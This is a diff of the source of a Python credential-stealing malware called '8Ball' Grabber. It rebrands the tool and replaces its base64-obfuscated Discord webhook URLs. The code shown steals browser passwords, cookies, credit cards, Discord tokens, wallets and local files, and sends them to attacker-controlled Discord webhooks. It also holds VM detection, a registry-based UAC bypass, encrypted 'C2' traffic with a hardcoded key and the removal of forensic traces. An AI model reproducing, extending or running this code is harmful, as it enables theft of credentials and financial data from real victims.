@@ -27,14 +27,14 @@ def RX_DB6(msg, level="INFO"):
         global _DBG_LOG, _DBG_MESSAGES
         _DBG_MESSAGES.append(line)
         if _DBG_LOG is None:
-            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8Ball_debug.log", "a", encoding="utf-8")
+            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8ball_debug.log", "a", encoding="utf-8")
         _DBG_LOG.write(line + "\n")
         _DBG_LOG.flush()
     except Exception:
         pass
 
 # Base64-obfuscated debug webhook URL (decoded at runtime)
-_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
 
 # Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
 def send_debug_embed():
@@ -50,12 +50,12 @@ def send_debug_embed():
             body = body[-4000:]
         payload = {
             "embeds": [{
-                "title": "8Ball | Debug Log",
+                "title": "8ball",
                 "description": f"```\n{body}\n```",
                 "color": 0x5865F2,
                 "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
             }],
-            "username": "8Ball | Debug",
+            "username": "8ball",
             "allowed_mentions": {"parse": []}
         }
         headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
@@ -333,7 +333,7 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw encodes this in base64 at build time.
-_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTA0MjkxMDY0NDA4MDY2MS9vY1UxYkR0ZmVJNk9UbXZUYlNIYWR1bDhEb0JzYWpIU3ljSHhwUnY1Zm45bm9EaDVWNkI3cW91QXh4Mks4QVVtenVJdA=="
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
 h00k = base64.b64decode(_HOOK_B64).decode()
 
 # Validate main webhook on startup
@@ -424,10 +424,10 @@ def send_confirmation_embed(title, description):
             "embeds": [{
                 "title": title,
                 "description": description,
-                "footer": {"text": "8Ball", "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"}
+                "footer": {"text": "8ball", "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp"}
             }],
-            "username": "8Ball | Grabber",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
+            "username": "8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
         L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
@@ -1710,7 +1710,7 @@ def UP104D70K3N(token, path):
                     "icon_url": f"{pfp}"
                     },
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                     },
                 "thumbnail": {
@@ -1718,8 +1718,8 @@ def UP104D70K3N(token, path):
                     }
                 }
             ],
-            "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -1751,15 +1751,15 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {
-               "title": f"8Ball | Data Extractor","fields": link,
+               "title": "8ball","fields": link,
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 },
                 }
             ],
-            "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -1782,15 +1782,15 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {"fields": endlist,
-                "title": f"8Ball | File 8Ball",
+                "title": "8ball",
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
                 }
             ],
-            "username": f"8Ball | Grabber",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -2134,47 +2134,47 @@ def G378r0W53r5(br0W53rP47H5):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-                "title": f"8Ball | Password 8Ball",
+                "title": "8ball",
                 "description": (
                     f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                     f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.txt]({filess[0]})\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.csv]({filess[1]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.txt]({filess[0]})\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.csv]({filess[1]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": f"8Ball | Cookies 8Ball",
+                "title": "8ball",
                 "description": (
                     f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                     f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Cookies.txt]({filess[2]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Cookies.txt]({filess[2]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": f"8Ball | Browser Data",
+                "title": "8ball",
                 "description": (
                     f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Histories.txt]({filess[5]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Histories.txt]({filess[5]})\n\n"
                     f"<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Autofills.txt]({filess[4]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Autofills.txt]({filess[4]})\n\n"
                     f"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_CreditCards.txt]({filess[3]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_CreditCards.txt]({filess[3]})\n\n"
                     f":bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Bookmarks.txt]({filess[6]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Bookmarks.txt]({filess[6]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             }
         ],
-        "username": "8Ball | Grabber",
-        "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+        "username": "8ball",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -2263,15 +2263,15 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-            "title": f"8Ball | App 8Ball",
+            "title": "8ball",
             "description": f"{wal}\n{ga}\n{ot}","footer": {
-                "text": f"8Ball",
+                "text": "8ball",
                 "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"
             }
             }
         ],
-        "username": f"8Ball | Grabber",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
+        "username": f"8ball",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -2572,8 +2572,8 @@ def filestealr():
     if not all_files:
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8Ball | Local Files Search", "description": "Local Files feature ran but found no matching files."}],
-            "username": "8Ball | Grabber",
+            "embeds": [{"title": "8ball", "description": "Local Files feature ran but found no matching files."}],
+            "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
         }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -2596,8 +2596,8 @@ def filestealr():
         desc += f"\n\n[Download ZIP]({zip_link})"
     data = {
         "content": f"@everyone @here {GLINFO}",
-        "embeds": [{"title": "8Ball | Local Files Grabbed", "description": desc}],
-        "username": "8Ball | Grabber",
+        "embeds": [{"title": "8ball", "description": desc}],
+        "username": "8ball",
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
     }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -2635,7 +2635,7 @@ import hashlib as _hl
 def c2_encrypt(plaintext, key=None):
     """Encrypt data with AES-256-GCM for C2 transmission"""
     if key is None:
-        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
     if isinstance(plaintext, str):
         plaintext = plaintext.encode()
     cipher = AES.new(key, AES.MODE_GCM)
@@ -2645,7 +2645,7 @@ def c2_encrypt(plaintext, key=None):
 def c2_decrypt(data_b64, key=None):
     """Decrypt AES-256-GCM C2 data"""
     if key is None:
-        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
     raw = base64.b64decode(data_b64)
     nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
     cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
@@ -2703,13 +2703,13 @@ def rand_temp_file(ext=""):
 def cleanup_indicators():
     """Remove common forensic indicators (logs, registry artifacts)"""
     try:
-        for p in [os.path.join(os.environ.get("TEMP", ""), "8Ball_debug.log")]:
+        for p in [os.path.join(os.environ.get("TEMP", ""), "8ball_debug.log")]:
             if os.path.isfile(p):
                 try: os.remove(p)
                 except: pass
         try:
             subprocess.run(
-                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 8Ball /f 2>nul",
+                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 8ball /f 2>nul",
                 shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW
             )
         except: pass
@@ -2735,7 +2735,7 @@ if not ctypes.windll.shell32.IsUserAnAdmin():
     if "--elevated" in sys.argv:
         RX_DB6("Still not elevated, aborting.", "ERROR")
         sys.exit(1)
-    ELEVATED_OUT = os.path.join(os.environ.get("TEMP", "."), "8Ball_elevated.txt")
+    ELEVATED_OUT = os.path.join(os.environ.get("TEMP", "."), "8ball_elevated.txt")
     import winreg as _wr
     _REG = r"Software\Classes\ms-settings\shell\open\command"
     _exe = os.path.abspath(sys.argv[0])
@@ -2775,13 +2775,13 @@ shuffled_run([filestealr, G47H3r411])
 random_delay(0.5, 2.0)
 
 if FEATURE_CONFIG.get("discord_tokens", False) and not T0K3Ns:
-    send_confirmation_embed("8Ball | Discord Tokens", "No Discord tokens found in browser or app storage.")
+    send_confirmation_embed("8ball", "No Discord tokens found in browser or app storage.")
 
 if FEATURE_CONFIG.get("discord_injection", False):
-    send_confirmation_embed("8Ball | Discord Injection", "Discord JavaScript injection feature executed.")
+    send_confirmation_embed("8ball", "Discord JavaScript injection feature executed.")
 
 if FEATURE_CONFIG.get("ip_location_info", False):
-    send_confirmation_embed("8Ball | IP & Location", GLINFO)
+    send_confirmation_embed("8ball", GLINFO)
 
 cleanup_indicators()
 # Send debug log embed to Discord (only if debug_mode is enabled)
